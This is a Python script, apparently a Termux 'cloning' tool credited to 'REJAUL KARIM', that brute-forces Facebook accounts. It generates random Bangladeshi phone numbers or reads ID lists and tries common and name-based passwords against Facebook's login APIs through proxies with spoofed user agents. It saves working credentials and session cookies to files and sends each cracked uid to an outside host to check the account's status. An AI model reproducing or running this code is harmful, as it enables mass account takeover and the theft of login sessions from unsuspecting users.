# Ownership - BY JAVA-SCIPT-TERMUX-COMMMAND 
#WORKING TANJID OPEN SOURCE 
#__________________IMPORT____________#
import os,random
import sys,time,uuid
try:
    import requests,bs4,mechanize,httpx
    import rich,json,subprocess,random,string
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
    print('\x1b[38;5;46m[\x1b[1;97m≈\x1b[38;5;46m] MODULE INSTALLING ')
    os.system('pip install requests rich')
    os.system('pip install mechanize')
    os.system('pip install bs4 httpx')
#________________PROXY______________#
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=1000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()
#________________LOOP______________#
loop,ok,cp,user = 0,[],[],[]
cok,plist = [],[]
#________________COLOUR______________#
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
#__________________LINE____________#
def linex():
    print(f'{G1}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
        os.system(f'clear')
        print(logo)
#________________UA______________#

uk= ["Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8T Build/RKQ1.201004.002) [FBAN/Orca-Android;FBAV/433.0.0.32.117;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/532438891;FBCR/O2.CZ;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1",]
uk1= ["Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; NokiaX2DS Build/JLS36C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/ru_RU;FBAV/86.0.0.9.190;",]
uk2 = ["Dalvik/2.1.0 (Linux; U; Android 13; M2103K19G Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/416.0.0.9.76;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/491071575;FBCR/JAZZTEL;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2103K19G;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.375,width=1080,height=2138};FB_FW/1;] FBBK/1",]
uk3 = ["Mozilla/5.0 (Linux; U; Android 4.2.2; pt-pt; GT-S7580 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/59.0.0.5.143;]",]
uk4 = ('Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/pt_PT;FBAV/19.0.0.4.121;]',)
def sex():
	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
	fbbv = str(random.randint(10000000, 66666666))
	fbrv = str(random.randint(000000000,999999999))
	density = random.choice(['2.0', '2.5', '3.0'])
	width = random.choice(["720", "1080", "1280"])
	height = random.choice(["720", "1080", "1280", "1440", "1920"])
	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/MTN-CG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]"
	return (ua)
#__________________LOGO____________#
logo =(f"""\x1b[1;97m


 .o88b. d8888b.  .d8b.   .o88b. db   dD 
d8P  Y8 88  `8D d8' `8b d8P  Y8 88 ,8P' 
8P      88oobY' 88ooo88 8P      88,8P   
8b      88`8b   88~~~88 8b      88`8b   
Y8b  d8 88 `88. 88   88 Y8b  d8 88 `88. 
 `Y88P' 88   YD YP   YP  `Y88P' YP   YD                                                   

\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;92m[\033[1;32m√\033[1;92m]\33[1;32m Github          : BLACK-404
\033[1;92m[\033[1;32m√\033[1;92m]\33[1;32m Tools Creator   : REJAUL KARIM
\033[1;92m[\033[1;32m√\033[1;92m]\33[1;32m Tools Version   : \033[1;35m3.0                   
\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
#__________________MAIN____________#
def menu():
    clear()
    print(f'{G1}[{G1}1{G1}]{G1} File Cloning ')
    print(f'{G1}[{G1}2{G1}]{G1} Random Cloning ')
    #print(f'{G1}[{G}3{G1}]{G1} CONTACT OWNER ')
    print(f'{G1}[{G1}0{G1}]{G1} Exit ')
    linex()
    sex = input(f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')
    if sex in ['1']:
        file()
    elif sex in ['2']:
        XXX()
 #   elif sex in ['3']:
       # os.system('xdg-open https://www.facebook.com/sk.sahathat');menu()
    elif sex in ['0']:
        sys.exit()
    else:
        menu()
#__________________RANDOM DEF____________#
def XXX():
    clear()
    print(f'{G1}[{A}1{G1}]{G1} BD Random Cloning ')
    #print(f'{G1}[{A}2{G1}]{G1} INDIA CLONE')
    print(f'{G1}[{A}0{G1}]{G1} Back Menu');linex()
    sex = input(f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')
    if sex in ['1']:
        bd()
    #elif sex in ['2']:
        #India()
    elif sex in ['0']:
    	menu()
    else:
        XXX()
#__________________BD DEF____________#
def bd():
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 017{G}/{A}019{G}/{A}018{G}/{A}016');linex()
    code = input(f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex()
    limit = int(input(f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    with ThreadPool(max_workers=30) as sexy:
        clear()
        print(f'{G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {code}')
        print(f'{G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}')
        print(f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex()
        for love in user:
            ids = code + love
            ax = ids[:8]
            bx = ids[:7]
            cx = ids[:6]
            xa = love[1:]
            xb = love[2:]
            psd = [ids,love,ax,bx,cx,xa,xb,'77889900','bangladesh','bangla','jannat','jannatul','mariya','sadiya','farjana','sabbir','rakibul','mahidul','nusrat','tamanna','mimmim','suraiya','alamin','arafat','bushra','roksana','tabassum','tanisha','tasnim']
            sexy.submit(randm,ids,psd)
    print('')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
    print(f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
    menu()
#__________________INDIA DEF____________#
def India():
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} +91639{G}/{A}+91934{G}/{A}+91902{G}/{A}+91701');linex()
    code = input(f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex()
    limit = int(input(f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with ThreadPool(max_workers=30) as sexy:
        clear()
        print(f'{G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {code}')
        print(f'{G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}')
        print(f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex()
        for love in user:
            ids = code + love
            psd = [love,ids[:8],'57273200','59039200','57575751']
            sexy.submit(randm,ids,psd)
    print('')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')
    print(f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')
    print(f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
    menu()
#__________________FILE DEF____________#
def file():
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A}TANJID.txt');linex()
    file = input(f'{G1}[{A}?{G1}]{G1} FILE NAME {A}➢{G1} ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{G1}[{A}≈{G1}]{R} FILE NOT FOUND');time.sleep(1)
        file()
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} Example {A}➢{G1} {G1}[{A}1-20{G1}]{G1}');linex()
    limit = int(input(f'{G1}[{A}?{G1}]{G1} PASSWORD LIMIT {A}➢{G1} '))
    clear()
    for x in range(limit):
        print(f'{G1}[{A}≈{G1}]{G1} Example {A}➢{A} firstlast{G1}/{A}first123{G1}/{A}last123')
        plist.append(input(f'{G1}[{A}?{G1}]{G1} PASSWORD NO {G1}[{A}{x+1}{G1}]{G1} {A}➢{S} '));linex()
    with ThreadPool(max_workers=30) as sexy:
        tl = str(len(fo))
        clear()
        print(f'{G1}[{A}≈{G1}]{G1} TOTAL ID {A}➢{G1} {tl}')
        print(f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex()
        for user in fo:
            ids,names = user.split('|')
            psd = plist
            sexy.submit(M1,ids,names,psd)
    print('')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f'{G1}[{A}≈{G1}]{G1} Process Has Been Successful')
    print(f'{G1}[{A}≈{G1}]{G1} Total-OK {G1}➢{G1} {str(len(ok))}')
    print(f'{G1}[{A}≈{G1}]{M} Total-CP {G1}➢{M} {str(len(cp))}')
    print(f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    input(f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')
    menu()
#__________________FILE METHOD____________#
def randm(ids,psd):
    global loop,ok
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    sys.stdout.write(f'\r\r{A}[{G1}KARIM{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
            'format':'json',
            'device_id':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'generate_analytics_claims':'1',
            'community_id':'',
            'cpl':'true','try_num':'1',
            'family_device_id':str(uuid.uuid4()),
            'credentials_type':'password',
            'source':'login',
            'error_detail_type':'button_with_disabled',
            'enroll_misauth':'false',
            'generate_session_cookies':'1',
            'generate_machine_id':'1',
            'currently_logged_in_userid':'0',
            'locale':'en_US',
            'client_country_code':'US',
            'fb_api_req_friendly_name':'authenticate',
            'api_key':'62f8ce9f74b12f84c123cc23437a4a32',
            'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': sex(),
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close',
            'Content-Type':'application/x-www-form-urlencoded',
            'Host':'graph.facebook.com',
            'X-FB-Net-HNI':str(random.randint(2e4, 4e4)),
            'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Connection-Type':'GRAMEEN',
            'X-Tigon-Is-Retry':'False',
            'x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
            'x-fb-device-group':'5120',
            'X-FB-Friendly-Name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':'graphservice',
            'X-FB-HTTP-Engine':'Liger',
            'X-FB-Client-IP':'True',
            'X-FB-Server-Cluster':'True',
            'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head,allow_redirects=False).text
            q = json.loads(po)
            if 'access_token' in q:
                uid = str(q['uid'])
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
                if res == 'LIVE':
                	print(f'\r\r{A}[{G1}KARIM-OK{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/KILLER-XD-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                	print(f'\r\r{A}[{S} KILLER-XD{A}]{S} {uid} {A}|{S} {pas}');break
            else:continue
        loop+=1
    except Exception as e:
        pass
#__________________RANDOM METHOD____________#
def M1(ids,names,psd):
    global loop,ok
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    sys.stdout.write(f'\r\r{A}[{G1}KARIM{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for pw in psd:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': ids,
            'password': pas,
            'generate_analytics_claims': '1', 
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false', 
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'meta_inf_fbmeta': '', 
            'currently_logged_in_userid': '0', 
            'fb_api_req_friendly_name': 'authenticate'}
            head={'User-Agent':uk, 
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*', 
            'Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'X-FB-Friendly-Name': 'authenticate', 
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 
            'X-FB-Net-HNI': str(random.randint(20000, 40000)), 
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'}
            po = requests.post('https://api.facebook.com/method/auth.login',data=data,headers=head).json()
            if 'access_token' in po:
                print(f'\r\r{A}[{G1}KARIM-OK{A}]{G1} {ids} {A}|{G1} {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/KILLER-XD-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{A}[{M} KARIM-CP{A}]{M} {ids} {A}|{M} {pas}')
                open('/sdcard/KILLER-XD-CP.txt','a').write(ids+'|'+pas+'\n')
            else:continue
        loop+=1
    except Exception as e:
        pass
if __name__ == '__main__':
    menu()